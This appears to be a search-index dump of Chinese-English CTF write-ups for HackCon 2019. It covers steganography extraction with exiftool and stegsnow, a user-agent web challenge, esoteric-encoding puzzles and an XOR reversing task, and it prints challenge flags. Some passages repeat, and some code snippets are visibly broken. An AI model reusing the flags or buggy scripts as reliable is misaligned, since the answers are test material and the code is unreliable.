into an ASCII String, it turns into gibberish text. After spending a long time trying to figure out that binary, turns out it is a QR Code. After I convert it into a QR Code, the decoded QR is the flag. web \u00b6 Given a web http://68.183.158.95/secret_agent/ that show a string Should d4rkc0de make their own browser . It is a classic challenge, we just need to change the user-agent to that string. Jorge Luis Borges \u00b6 \u663e\u7136\u90a3\u4e2a\u662fBrainFuck \u5f97\u5230 First, we decode the description with Brainfuck deobfuscator, we have a equation: x 4-314x 3+2771x^2-7954x+7320=0 Solve it!!! x=2, x=3, x=4, x=305 \u7b2c\u4e00\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u662f\u8fd9\u6837\u5b50\u7684\uff1a 1 33 68 64 68 6a 32 69 6e 6f 35 ..... \u663e\u7136\u662fASCII\u7801\uff0c\u8f6c\u4e00\u4e0b\u5f97\u5230 1 3hdhj2ino5cs711ip1jl8kl816gz0it3fzz6hzuo4lkk0as7xitwr3he6oopwsv7voci3i4tepb22sqltf0ed7814zahhag1cit4kd8zxfnyrz2okh07l4z6k87941pcjnemlnyq3rfp1qfbam6mi6h7a9x3b1m24to0jv66cuayb7jx0nvfwkhhwyz7m6fv99rplkile9ngdr0hv49xb74clrheoqowkd8a9sbgl5ia4k3bucrxax1ydxu6louv42iphyd01znbz004sgw8rgqu148se864xvwk9z2smvikys308v242njv8yg52o96sig0hf34q33dd157x5veulwbyvqrzf1hbywk8itwx14j0bdksigmx18ngi79gdgk1t65lqpyk9ngz3zxn6pa5j0ys7144cfqkew98s9nprasm3xfi6nkpliinklxgtgkj0ym1ecw0rfiph62futxqmfb9qseqpasg2bel91efisdtjftsrlutdtb9hkzx81lxa92s9g8fysczabqy3oal9iwq3c2761m1rwp41msqfk8tis1rhgwa31z6fe3yj4gmvsxlw1wrhyb1f7g5cf02syf8ji721d1pcu9yux8sdk3zukhobvs3axkuc9qfvgu34eq2wn5xbt6eha05tugff5v0aingolwz7170vxhvtscqbt5nu1pl8j18dtk77rlvpbsmoxi0v0ah1o1b8afamhs82n4x2vbdsoxmm36ps1cf34dqljgfsga2fozoefde36mtuvg9urd5fohu97hu1gu8xllcxta5zcqmkbz3ovpuv5f8oe2c09sfhk0w1yvlxdnh7ywra9lon125q7f5v9fyppfnun9j0zgtj7i9cmt5ykgsdbr9hil9f5b2ettg29quvb02da3xl5tvie5ky9kwb1bxu4bxku5j82j9upyenach78zq0b8htp3wmdf87yo6wmm1tpfoxbu4oa3js8mjnvu209rf0o64wek2135pvbobu378bjz0w3rq9umxfxtj2v69tjwkdux0n2wpzkgopzmgcdvvb6wv4y8g6f0u12xbwcepot5lm55sm2o5c5r5gb329xvauknvkq0udkvou9lv75jurxa64k208u93e68fk8n3q6qs66fofowfwqjidn11v3febxqu77jnj4923rnnkrvutcr625l8e5z330marrt5benok542p19qob6cxzasy8m3q4sx4wszzun956ucfwm1qqo62660dgqmo8t7y2gj3ylkgap7gr3gfwtkkeqhwenqrywpg8it6clj744c3lylkzqh89h55105izp3jz6jr2ft5e6d7abinisdedkt6i6fh77s57w96hgb86rbv43u4w8tymm29syjlem27c7hf4yabouq68s4zzb9hm9cla5i0ymf8rz3fctei4bofdolbriyhl9adl9eva393d7kla5blzqr7hmz3p1p80a9akvvduumov70xchc0jbctwq52ju8t6ieeuseqdroi3zkjw7pj6ivtjr2cei262gldr4abor694m5iubmhueyg2pxrjuj1h9tqfytc1uzk23aru3bmpgblo4l4l4kf5ivwcp67nhy9mgeisu571fult6wkuvlbywuzaheuxml7m4u1yjqw6g0u6xld1yzg5qisf7j5bz569kajvh6stlqmcs0la1wnri9sg9m3diu7br88wlsb6dg17z9zuw63ej54c24sxnduhirh7p4ltromy26ra3edsiiwj4gkkxa5zxrv7bploeskujv549q6g69eo8f0guopfr9h98xkeeoeow69x8gokutl8m0swoa2u4oq9a0okmtpl0c6j3rumsqyv7lr8dw1wf85th7uz8vjy1ovitw9woshu4tdhaa4ur3dpa79r7qttq2000z2rmacgj63bw5gdgnjj9tb3b7z72zu0hvbr61z0tw3upk7sn162r0wmqnifxr2tr7fd0mhyp79xvu64amxwvqes6e5wwa4phj1myw4yfcn7vfos13z3urmsyncggtkubs8ifriqb7frm6wajwu9wizpkfdrn6hob92322t63fi7on7xenllys6n76tx4e7mw880an07ij95g3ghyd8dbebcrfdkl1tb58owhta5qhzwekxqmn3tok8sv83kumztyamkeph0lw0cvvs6yamxynngy4vr3j7582m614tep2lfahgoubzzos3rloyedlbfy00x0n38jziysdkdgji1uxzyhnst931dqgz7w6d9g1wyia0rki1zzit58soj5vbx5xrbwwvw0ek0c6y8gujx3xvajjqcsl5t7sesjfb0tr8p7flp8fzpokzl42s0b86gh6ggnsymguzeeivwzhjz096wj3p8kl46izj35d2w4hlbx5fkleltl2ghdttx4698blgd4wbux04svz1e9649dzhja2s01kyl5opmy1wxsiypv1lc64s6oeee6e41s1enbijtbj19funhpmsmzsqpzpkqplimuycuhsz6ljdvhk3e3o6ml7ezckw2x4ry4pyxqw4lji1agq0wj7n7a1xwz78erzz831jciq866su6puq5h9omsf7oa8l18ix7l4lw6iry2o612lkgd83meqlun3rd6wej821e8noktby8nhoy6e97jkcv52haiahe4tpdzh0pprnjwm203yumiadjzwvvrkqyxdzyx9pnook6s9xwf0fjiwxsjff6w0fgpdhv5glqd2ienn1h475i45df8j8wja8jpotloji3mdwdt8m8qmtyjxzrcmcxkvw2negz1hda7j2xb6u3vhhnq2xt89clygemmj1eosg6n6px360hngiq94sk6xqz1hr02lpombgrh84be0w5zr3sgv4n6wo7d59tddl6ycwk19c7r5ebqc71z1p00odk34dsyah3bb96npl05d6yhdicz8yv4eaauu1j4h57ia8yvm5r1drxz5zfbpx81zys2l9babdz4w6mopvthslhffjxjhj7wor7dyxxstn62gb4rellqyv3890c7uutqhj9yuwgxr6l9mcvqe2wd74fue5pp0e5dnzo0s70lknmuy0qmpg1o1rus1kybfu5vcwax7omsm6xk621ddwfn9tatwbc1slsgh7139ufgnjwdbx9acqewaf2lkdglakng82etn9xfupzvo9fvvibt28m8am0iiwdoyvs2fkypcdose7a3gs2kwkd4ua1wjf \u7136\u540e\u770b\u7b2c\u4e8c\u4e2a\u6587\u4ef6 1 2 3 4 5 6 x = 0, y = 0, rule = B3/S23 3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob 3ob3ob3ob3ob3ob3ob3ob3ob3o$obobobobobobobobobobobobobobobobobobobobobo bobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobo bobobobobob3o$obobobobobobobobobobobobobobobobobobobobobobobobobobobob obobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobob3o x = 0, y =0, rule = B3/S23 ? We Google it and found some interesting results : RLE file format , Conway's Game of Life . Okay, we tried with all part with \"!\" present. With a final part, import to this , we get a result \u53c8\u662f\u4e00\u79cd\u795e\u5947\u7684\u7f16\u7801 Run Length Encoded Run Length Encoded The first line is a header line, which has the form 1 x = m, y = n x = 0, y =0, rule = B3/S23 ? We Google it and found some interesting results : RLE file format , Conway's Game of Life . Okay, we tried with all part with \"!\" present. With a final part, import to this , we get a result 1 2 3 4 x = 0, y = 0, rule = B3/S23 10$obo5b3obob3obob ob$obob3obo7bobobobobob3o$bo2b3ob3obo2bo2b3ob3o$bo2b3obo3bobo3b3ob3ob3o $bo2bobobo3bob3obobob3o$! \"YmFiZWw= \" (base64) -> babel Okay, Google again. The name of challenge \"Jorge Luis Borges\", \"book\", \"babel\". And then, we get the book with a website https://libraryofbabel.info hex name: strings from file1 wall : 2 shelf : 3 volume: 4 page: 305 \u8fd9\u8111\u6d1e\u6709\u70b9\u5927\u554a\u3002 Invisible Programming \u00b6 \u5f97\u5230\u4e00\u4e2aCPP\u6587\u4ef6 1 2 3 4 5 6 7 #include <iostream> using namespace std ; int main () { cout << \"The flag is d4rk{You_thought_this_will_be that_much_easy}c0de \\n \" ; return 0 ; } \u5f88\u5947\u602a\uff0c\u4e8e\u662f\u3002\u3002 After googling a bit, it seems to resemble WhiteSpace esolang. Trying to execute it throws some syntax errors, so I quickly gave up on that. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import re h = open ( 'hello_world.cpp' ) lines = [ x [: - 1 ] for x in h . readlines () ] # remove newline char h . close () flag = [] for line in lines : num = '' . join ( re . findall ( r '\\s+' , line )) . replace ( ' \\t ' , '1' ) . replace ( ' ' , '0' ) if num : try : flag . append ( chr ( int ( num , 2 ))) except : pass print ( '' . join ( flag )) \u76ee\u524d\u5bf9\u4e8epython\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u8fd8\u4e0d\u662f\u5f88\u719f\u6089\u4e3b\u8981\u662f\u90a3\u4e2a join(re.findall(r'\\s+', line)).replace('\\t','1').replace(' ','0') \u6b64\u65f6\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u4f46\u662f\u8fd8\u9700\u8981\u5bf9\u6587\u4ef6\u505a\u4e00\u4e9b\u4fee\u6539 \u4e00\u4e2a\u5e08\u5085\u5199\u7684js\u7248\u672c\uff1a 1 2 3 4 5 6 7 8 9 10 11 function decoder ( str ) { var flag = '' ; str . replace ( /.{7}/g , function ( strByte ) { var binStr = strByte . replace ( / /g , '0' ). replace ( / /g , '1' ); var charCode = parseInt ( binStr , 2 ); result += String . fromCharCode ( charCode ); }); return flag ; } SuperEncryptor | Reversing \u00b6 \u4e0d\u61c2\u56fd\u5916\u7684\u5206\u7c7b\uff1a \u5f97\u5230\u4e00\u4e2aenc\u8fd8\u4ee5\u4e3a\u662f\u6d41\u91cf\u5305\uff0c\u7ed3\u679c\u662f\u4e00\u6bb5\u5b57\u7b26\uff1a 1 d9a68b755a6e7be6aaa912105d749fb8ae33506e4adefeb0745e5c70cfa88c71 \u8fd9\u6837\u7684\u4e00\u4e2a\u7a0b\u5e8f \u8fd8\u662f\u770bwp\u5427 1 2 3 4 5 6 7 8 9 echo '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' | ./q3 _ _ __ __ _ _ __ _____ __ | \\ | | | \\/ (_) | \\ \\ / / _ \\/_ | | \\| | __ _ _ __ ___ | \\ / |_| |_ ___ ___ \\ \\ / / | | || | | . ` |/ _` | '_ \\ / _ \\| |\\/| | | __/ _ \\/ __| \\ \\/ /| | | || | | |\\ | (_| | | | | (_) | | | | | || __/\\__ \\ \\ / | |_| || | |_| \\_|\\__,_|_| |_|\\___/|_| |_|_|\\__\\___||___/ \\/ \\___(_)_| String to encrypt (Max 5000) : Encrypted : abcdef4123310abcdef4123310ab \u7136\u540e\u5c31\u83ab\u540d\u7684\u8ba4\u4e3a\u8fd9\u4e2a\u662f\u4ea6\u6216\u8fd0\u7b97\uff1f\uff1f\u4e0d\u8fc7\u4ed6\u8fd9\u662f\u600e\u4e48\u60f3\u51fa\u6765\u7684\u554a First thought that came to my mind was that it was an XOR operation with the key abcdef4123310 . When I XORed this key with the content of flag.enc, I got: 1 rkd4y_{MgFS3lt4uArs_Ju3_5}mpdec0 which looks like the shuffled version of the flag. Swapped two sides inside each 4-byte block, and got the flag: 1 d4rk{My_S3gF4ults_Ar3_Jump5}c0de \u8fd9\u6837\u5c31\u5f97\u5230flag\u4e86 GIFe_me_time | Forensics \u00b6 \u8fd9\u4e2a\u7c7b\u522b\u7684\u9898\u76ee\u4e5f\u662f\u7b2c\u4e00\u6b21\u89c1 \u8bbf\u95ee\u4e86\u8fd9\u6837\u4e00\u4e2a\u9875\u9762 \u53c2\u8003 \u00b6 https://medium.com/@Nicholaz99/hackcon2019-writeup-4639553b9355 https://ctftime.org/writeups https://hackcon.online/challenges#GIMP IT Github Invisible Programming","title":"hackcon2019"},{"location":"writeup/hackcon2019/#hackcon2019","text":"","title":"hackcon2019"},{"location":"writeup/hackcon2019/#small-icon-mush-wow","text":"\u56fe\u7247: Given a file stego.jpg. Just like the title said, I try to extract the thumbnail picture and I got a QR Code. I try to decode it and I got the Flag. The command that I used to extract: exiftool -b -ThumbnailImage stego.jpg > my_thumbnail.jpg \u7136\u540e\u6211\u5c31\u53d1\u73b0\u4e86\u53e6\u4e00\u79cd\u89e3\u6cd5 binwalk \u662f\u53ef\u4ee5\u770b\u5230\u6709\u51e0\u4e2a\u56fe\u7247\u7684\uff0c\u4f46\u662f\u5374\u63d0\u53d6\u4e0d\u51fa\u6765\uff0c foremost \u8bd5\u4e86\u4e00\u4e0b\u4e5f\u884c\u4e0d\u901a\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u76f4\u63a5\u7528 dd \u5427","title":"Small icon mush wow"},{"location":"writeup/hackcon2019/#too-cold-for-steg","text":"Given a file final.txt . When I try to open it, the content is a Sherlock Holmes Novel. Based on the title Too Cold, I guess that this challenge will be related to stegsnow tools. In order to extract the hidden data, I need to find the password. I try to look it on the file and the password was store on there. The command to extract it: stegsnow -C -p \u201cd4rkc0de-IIITD\u201d final.txt \u540e\u6765\u624d\u5f97\u77e5\u8fd9\u662f\u4e00\u79cd\u6587\u672c\u9690\u5199\uff0c\u5c06\u4fe1\u606f\u9690\u85cf\u5728\u6587\u672c\u4e2d stegsnow -m \u6307\u5b9a\u8981\u9690\u85cf\u7684\u4fe1\u606f\uff0c source.txt \u662f\u539f\u6765\u7684\u6587\u4ef6\uff0c readme.txt \u662f\u9690\u85cf\u4e86\u4fe1\u606f\u7684\u6587\u4ef6 1 stegsnow -C -m 'We attack at dawn with Legos!' source.txt readme.txt \u63d0\u53d6\u4fe1\u606f 1 stegsnow -C readme.txt \u5c06\u6587\u4ef6\u9690\u85cf\u5230\u53e6\u4e00\u4e2a\u6587\u4ef6\u4e2d 1 stegsnow -C -f hidden_message.txt source.txt readme.txt \u63d0\u53d6\u6587\u4ef6 1 stegsnow -C readme.txt \u52a0\u5165\u5bc6\u7801\u4fdd\u62a4 1 stegsnow -C -p \"hello12345\" -f hidden_message.txt source.txt readme.txt \u89e3\u5bc6 1 stegsnow -C -p 'hello12345' readme.txt","title":"Too cold for steg"},{"location":"writeup/hackcon2019/#gimp-it","text":"\u5c1d\u8bd5\u901a\u8fc7\u5199\u811a\u672c\u8f6c\u5316 1 2 3 4 5 6 7 8 9 10 11 f = open ( 'xcf.zip' , 'wb' ) a = \"504b 0304 1403 0000 0800 d005 d14e 2057 \\n 40de 7505 0000 c416 0200 0800 0000 6461 \\n 7461 2e74 7874 ecdd d16e 1331 1445 d15f \\n bafe ff9f 03aa 628a 844c 508e 0fa9 baf6 \\n a3a7 93eb acf4 6592 a633 9224 4992 2449 \\n 9224 4992 2449 9224 4992 2449 9224 497a \\n 8956 a4f9 4399 9f7b f4e8 ec32 3b3d 767e \\n 64e2 c489 0722 4e7c 1127 7e7d 5ae6 e788 \\n 1327 4e9c f8b9 c319 b173 57b8 09d7 30e8 \\n 4e5b e126 5cc3 a03b 6d85 9b70 0d83 eeb4 \\n 156e c235 0cba d356 b809 d730 e84e 5be1 \\n 265c c3a0 3b6d 859b 700d 83ee b415 6ec2 \\n 350c bad3 56b8 09d7 30e8 4e5b e126 5cc3 \\n 2073 9dfc e8b9 ffbe 8367 f672 ae61 409c \\n 38f1 e434 e2c4 8913 cf4e 234e 9c38 f1ec \\n 34e2 af2f 7e7e bc7b afdb 3d03 e2c4 8927 \\n a711 1fe2 c489 47a7 111f e2c4 8947 a711 \\n 9f97 127f f4f5 c81c 7595 4ffc c634 e243 \\n 9c38 f1e8 34e2 439c 38f1 e834 e243 fc13 \\n 887f 2872 559e f974 3833 a361 903e 8338 \\n 71e2 cf4b 1227 9e3b 373d 2d23 499c 78ee \\n dcf4 b48c 2471 e2b9 73d3 d332 925f 43fc \\n 5c46 e3d5 d7fe 52e4 7bbd 2b52 fa99 ffaf \\n b553 c46f ac9d 227e 63ed 14f1 1b6b a788 \\n df58 3b45 fcc6 da29 e237 d64e 11bf b176 \\n 8af8 8db5 5329 f174 99bf 70ce 7cb2 3c5f \\n 22e2 ed88 b723 de8e 783b e2ed 88b7 23de \\n 8e78 3be2 29a1 7b57 b86b 97fe 74f8 dedd \\n 69e6 5866 a78d 1d10 df95 7640 7c57 da01 \\n f15d 6907 c477 a51d 10df 9576 407c 57da \\n 01f1 5d69 07c4 77a5 1d10 4f4d 5bbb cc7f \\n 59ca ecb4 3183 787b 06f1 f60c e2ed 19c4 \\n db33 88b7 6710 6fcf 20de 9e41 bc3d 8378 \\n 7bc6 f702 df05 cdcc 4d7f 769c f1cb fc1e \\n 7c8c f8fb 21e2 4f1f 253e c4df 22fe 7e88 \\n f8d3 4789 0ff1 b788 bf1f 22fe f451 e243 \\n fcb7 32f7 1e4d bf57 9079 3720 7d8f 9bc6 \\n 553e 71e2 c489 1327 4e7c 8638 71e2 c433 \\n cfe3 67c4 5f4d 3c73 b59d b99e 9e49 bccf \\n 9079 af20 734f 9a5f 1127 fe23 e2c4 8913 \\n ffc6 debd 6437 0a04 0110 bc52 73ff cb8d \\n b540 c67e 33e3 05d9 e55f e4da aa46 216f \\n 10d0 22de d4bc 23e2 d788 137f 449c 7827 \\n beef 974e 9b67 73f7 e95e 4ace fcd7 33e2 \\n c43f 8838 71e2 c489 1327 4e9c f833 e2c7 \\n af11 af77 4a6a deef bed5 ea79 67c4 a7e6 \\n 9d11 9f9a 7746 7c6a de19 f1a9 7967 c4a7 \\n e69d 119f 9a77 467c 6ade 19f1 a979 67c4 \\n a7e6 bd29 7d6e 76dd a8b9 4fba f976 61df \\n 7f62 2359 af46 9c38 71e2 ed6a c489 1327 \\n deae 469c 38f1 9f2f 5e3f 19bb ef48 1bc9 \\n b576 ddc7 4d9c f83f 234e 9cf8 ed35 9abf \\n 234e 9c38 71e2 7f8d 38f1 21f1 d9fb 86f7 \\n 9dc7 3777 60d7 67fe c489 1327 4e9c 3871 \\n e2f7 5fd1 5835 5388 1327 4ebc 38eb 6df6 \\n 653a 929a 4fa6 d678 469c f8ed 883f 22fe \\n 8c38 f1db 117f 44fc 1971 e2b7 23fe 88f8 \\n b5e2 7aed ecf7 07cd be51 cd95 e523 d120 \\n 4e7c 11bf bd06 71e2 c489 1327 4e9c 38f1 \\n ef27 3e71 85b7 596d ad62 0fa6 faee e8ff \\n 479c 3871 e2c4 8913 ef22 4e9c 38f1 36e2 \\n 33e2 fbce 899b 2bd0 cd31 37bf 6fda ec23 \\n 4c9c f822 4e9c 3871 e2c4 893f 227e fbbd \\n 1127 fefd c56b e746 68df f702 fb9c ebd7 \\n 12bf d6ac 4b9c 3871 e267 cdba c489 1327 \\n 7ed6 ac4b 9cf8 4f17 afef 667e df8e 7da3 \\n 9adf c2a9 af36 1327 4e9c 3871 e2c4 df57 \\n 4812 274e 9cf8 6b85 24f1 9de2 fb7e 93a6 \\n 596d 6272 a34b 9cf8 224e 9c38 71e2 1f45 \\n 9cf8 edd5 2626 1327 4efc ab34 714d b871 \\n 5e2f ddbf cbfb f33f 19e2 d311 9f8e f874 \\n c4a7 233e 1df1 e988 4f47 7c3a e22f 7dfa \\n f5df d79a 3d79 ebb3 f7e6 337a 463c 9bb7 \\n 928e 24e2 9788 67f3 56d2 9144 fc12 f16c \\n de4a 3a92 885f 229e cd5b 4947 12f1 4bc4 \\n b379 2ba9 7e16 b479 aab6 b973 b9d9 a1a9 \\n b627 4e9c 3871 e2c4 89bf 8d38 71e2 c489 \\n ff36 f17d 67c7 cd0e 48fb 9eaf 7d54 3ecd \\n 4b9c 7877 ccc4 8913 27de 1e33 71e2 c489 \\n b7c7 4c9c f89f f6ed 1887 4118 88a2 e095 \\n 9cfb 5f2e 0d12 4189 94c2 cf80 c4fc 1ab3 \\n ec6c 055a ee21 ded4 6da6 507f 0318 5b88 \\n 139f af4b 9c38 71e2 6d5d e2c4 8913 6feb \\n 1227 7e37 f146 add9 93ae dfcf 7f84 38f1 \\n e98e 8813 3f84 38f1 e98e 8813 3f84 38f1 \\n e98e 8813 ffc8 d2bb 34cf 5c4f b599 dbeb \\n d46d e62d 0bce 1227 4e9c 787b 9638 71e2 \\n c4db b3c4 8913 7f92 f8bf 5cf3 87ea bacd \\n e5e6 baf1 15e2 c489 1721 be87 3871 e245 \\n 88ef 214e 9c78 11e2 63bc 0150 4b01 023f \\n 0314 0300 0008 00d0 05d1 4e20 5740 de75 \\n 0500 00c4 1602 0008 0000 0000 0000 0000 \\n 0020 80b4 8100 0000 0064 6174 612e 7478 \\n 7450 4b05 0600 0000 0001 0001 0036 0000 \\n 009b 0500 0000 00\" b = a . split ( ' \\n ' ) for i in range ( len ( b )): n = b [ i ] . encode ( 'utf-8' ) f . write ( n ) f . close () \u4f46\u662f\u8fd9\u6bb5\u811a\u672c\u6ca1\u6709\u6210\u529f\u3002\u3002 When I see the first line of that hex text that I found, I realize that it is a zip file (based on the header). I copy that hex and save it as a zip file . I unzip it and I got a file called data.txt which contains binary file. When I convert it into an ASCII String, it turns into gibberish text. After spending a long time trying to figure out that binary, turns out it is a QR Code. After I convert it into a QR Code, the decoded QR is the flag.","title":"GIMP IT"},{"location":"writeup/hackcon2019/#web","text":"Given a web http://68.183.158.95/secret_agent/ that show a string Should d4rkc0de make their own browser . It is a classic challenge, we just need to change the user-agent to that string.","title":"web"},{"location":"writeup/hackcon2019/#jorge-luis-borges","text":"\u663e\u7136\u90a3\u4e2a\u662fBrainFuck \u5f97\u5230 First, we decode the description with Brainfuck deobfuscator, we have a equation: x 4-314x 3+2771x^2-7954x+7320=0 Solve it!!! x=2, x=3, x=4, x=305 \u7b2c\u4e00\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u662f\u8fd9\u6837\u5b50\u7684\uff1a 1 33 68 64 68 6a 32 69 6e 6f 35 ..... \u663e\u7136\u662fASCII\u7801\uff0c\u8f6c\u4e00\u4e0b\u5f97\u5230 1 3hdhj2ino5cs711ip1jl8kl816gz0it3fzz6hzuo4lkk0as7xitwr3he6oopwsv7voci3i4tepb22sqltf0ed7814zahhag1cit4kd8zxfnyrz2okh07l4z6k87941pcjnemlnyq3rfp1qfbam6mi6h7a9x3b1m24to0jv66cuayb7jx0nvfwkhhwyz7m6fv99rplkile9ngdr0hv49xb74clrheoqowkd8a9sbgl5ia4k3bucrxax1ydxu6louv42iphyd01znbz004sgw8rgqu148se864xvwk9z2smvikys308v242njv8yg52o96sig0hf34q33dd157x5veulwbyvqrzf1hbywk8itwx14j0bdksigmx18ngi79gdgk1t65lqpyk9ngz3zxn6pa5j0ys7144cfqkew98s9nprasm3xfi6nkpliinklxgtgkj0ym1ecw0rfiph62futxqmfb9qseqpasg2bel91efisdtjftsrlutdtb9hkzx81lxa92s9g8fysczabqy3oal9iwq3c2761m1rwp41msqfk8tis1rhgwa31z6fe3yj4gmvsxlw1wrhyb1f7g5cf02syf8ji721d1pcu9yux8sdk3zukhobvs3axkuc9qfvgu34eq2wn5xbt6eha05tugff5v0aingolwz7170vxhvtscqbt5nu1pl8j18dtk77rlvpbsmoxi0v0ah1o1b8afamhs82n4x2vbdsoxmm36ps1cf34dqljgfsga2fozoefde36mtuvg9urd5fohu97hu1gu8xllcxta5zcqmkbz3ovpuv5f8oe2c09sfhk0w1yvlxdnh7ywra9lon125q7f5v9fyppfnun9j0zgtj7i9cmt5ykgsdbr9hil9f5b2ettg29quvb02da3xl5tvie5ky9kwb1bxu4bxku5j82j9upyenach78zq0b8htp3wmdf87yo6wmm1tpfoxbu4oa3js8mjnvu209rf0o64wek2135pvbobu378bjz0w3rq9umxfxtj2v69tjwkdux0n2wpzkgopzmgcdvvb6wv4y8g6f0u12xbwcepot5lm55sm2o5c5r5gb329xvauknvkq0udkvou9lv75jurxa64k208u93e68fk8n3q6qs66fofowfwqjidn11v3febxqu77jnj4923rnnkrvutcr625l8e5z330marrt5benok542p19qob6cxzasy8m3q4sx4wszzun956ucfwm1qqo62660dgqmo8t7y2gj3ylkgap7gr3gfwtkkeqhwenqrywpg8it6clj744c3lylkzqh89h55105izp3jz6jr2ft5e6d7abinisdedkt6i6fh77s57w96hgb86rbv43u4w8tymm29syjlem27c7hf4yabouq68s4zzb9hm9cla5i0ymf8rz3fctei4bofdolbriyhl9adl9eva393d7kla5blzqr7hmz3p1p80a9akvvduumov70xchc0jbctwq52ju8t6ieeuseqdroi3zkjw7pj6ivtjr2cei262gldr4abor694m5iubmhueyg2pxrjuj1h9tqfytc1uzk23aru3bmpgblo4l4l4kf5ivwcp67nhy9mgeisu571fult6wkuvlbywuzaheuxml7m4u1yjqw6g0u6xld1yzg5qisf7j5bz569kajvh6stlqmcs0la1wnri9sg9m3diu7br88wlsb6dg17z9zuw63ej54c24sxnduhirh7p4ltromy26ra3edsiiwj4gkkxa5zxrv7bploeskujv549q6g69eo8f0guopfr9h98xkeeoeow69x8gokutl8m0swoa2u4oq9a0okmtpl0c6j3rumsqyv7lr8dw1wf85th7uz8vjy1ovitw9woshu4tdhaa4ur3dpa79r7qttq2000z2rmacgj63bw5gdgnjj9tb3b7z72zu0hvbr61z0tw3upk7sn162r0wmqnifxr2tr7fd0mhyp79xvu64amxwvqes6e5wwa4phj1myw4yfcn7vfos13z3urmsyncggtkubs8ifriqb7frm6wajwu9wizpkfdrn6hob92322t63fi7on7xenllys6n76tx4e7mw880an07ij95g3ghyd8dbebcrfdkl1tb58owhta5qhzwekxqmn3tok8sv83kumztyamkeph0lw0cvvs6yamxynngy4vr3j7582m614tep2lfahgoubzzos3rloyedlbfy00x0n38jziysdkdgji1uxzyhnst931dqgz7w6d9g1wyia0rki1zzit58soj5vbx5xrbwwvw0ek0c6y8gujx3xvajjqcsl5t7sesjfb0tr8p7flp8fzpokzl42s0b86gh6ggnsymguzeeivwzhjz096wj3p8kl46izj35d2w4hlbx5fkleltl2ghdttx4698blgd4wbux04svz1e9649dzhja2s01kyl5opmy1wxsiypv1lc64s6oeee6e41s1enbijtbj19funhpmsmzsqpzpkqplimuycuhsz6ljdvhk3e3o6ml7ezckw2x4ry4pyxqw4lji1agq0wj7n7a1xwz78erzz831jciq866su6puq5h9omsf7oa8l18ix7l4lw6iry2o612lkgd83meqlun3rd6wej821e8noktby8nhoy6e97jkcv52haiahe4tpdzh0pprnjwm203yumiadjzwvvrkqyxdzyx9pnook6s9xwf0fjiwxsjff6w0fgpdhv5glqd2ienn1h475i45df8j8wja8jpotloji3mdwdt8m8qmtyjxzrcmcxkvw2negz1hda7j2xb6u3vhhnq2xt89clygemmj1eosg6n6px360hngiq94sk6xqz1hr02lpombgrh84be0w5zr3sgv4n6wo7d59tddl6ycwk19c7r5ebqc71z1p00odk34dsyah3bb96npl05d6yhdicz8yv4eaauu1j4h57ia8yvm5r1drxz5zfbpx81zys2l9babdz4w6mopvthslhffjxjhj7wor7dyxxstn62gb4rellqyv3890c7uutqhj9yuwgxr6l9mcvqe2wd74fue5pp0e5dnzo0s70lknmuy0qmpg1o1rus1kybfu5vcwax7omsm6xk621ddwfn9tatwbc1slsgh7139ufgnjwdbx9acqewaf2lkdglakng82etn9xfupzvo9fvvibt28m8am0iiwdoyvs2fkypcdose7a3gs2kwkd4ua1wjf \u7136\u540e\u770b\u7b2c\u4e8c\u4e2a\u6587\u4ef6 1 2 3 4 5 6 x = 0, y = 0, rule = B3/S23 3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob 3ob3ob3ob3ob3ob3ob3ob3ob3o$obobobobobobobobobobobobobobobobobobobobobo bobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobo bobobobobob3o$obobobobobobobobobobobobobobobobobobobobobobobobobobobob obobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobob3o x = 0, y =0, rule = B3/S23 ? We Google it and found some interesting results : RLE file format , Conway's Game of Life . Okay, we tried with all part with \"!\" present. With a final part, import to this , we get a result \u53c8\u662f\u4e00\u79cd\u795e\u5947\u7684\u7f16\u7801 Run Length Encoded Run Length Encoded The first line is a header line, which has the form 1 x = m, y = n x = 0, y =0, rule = B3/S23 ? We Google it and found some interesting results : RLE file format , Conway's Game of Life . Okay, we tried with all part with \"!\" present. With a final part, import to this , we get a result 1 2 3 4 x = 0, y = 0, rule = B3/S23 10$obo5b3obob3obob ob$obob3obo7bobobobobob3o$bo2b3ob3obo2bo2b3ob3o$bo2b3obo3bobo3b3ob3ob3o $bo2bobobo3bob3obobob3o$! \"YmFiZWw= \" (base64) -> babel Okay, Google again. The name of challenge \"Jorge Luis Borges\", \"book\", \"babel\". And then, we get the book with a website https://libraryofbabel.info hex name: strings from file1 wall : 2 shelf : 3 volume: 4 page: 305 \u8fd9\u8111\u6d1e\u6709\u70b9\u5927\u554a\u3002","title":"Jorge Luis Borges"},{"location":"writeup/hackcon2019/#invisible-programming","text":"\u5f97\u5230\u4e00\u4e2aCPP\u6587\u4ef6 1 2 3 4 5 6 7 #include <iostream> using namespace std ; int main () { cout << \"The flag is d4rk{You_thought_this_will_be that_much_easy}c0de \\n \" ; return 0 ; } \u5f88\u5947\u602a\uff0c\u4e8e\u662f\u3002\u3002 After googling a bit, it seems to resemble WhiteSpace esolang. Trying to execute it throws some syntax errors, so I quickly gave up on that. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import re h = open ( 'hello_world.cpp' ) lines = [ x [: - 1 ] for x in h . readlines () ] # remove newline char h . close () flag = [] for line in lines : num = '' . join ( re . findall ( r '\\s+' , line )) . replace ( ' \\t ' , '1' ) . replace ( ' ' , '0' ) if num : try : flag . append ( chr ( int ( num , 2 ))) except : pass print ( '' . join ( flag )) \u76ee\u524d\u5bf9\u4e8epython\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u8fd8\u4e0d\u662f\u5f88\u719f\u6089\u4e3b\u8981\u662f\u90a3\u4e2a 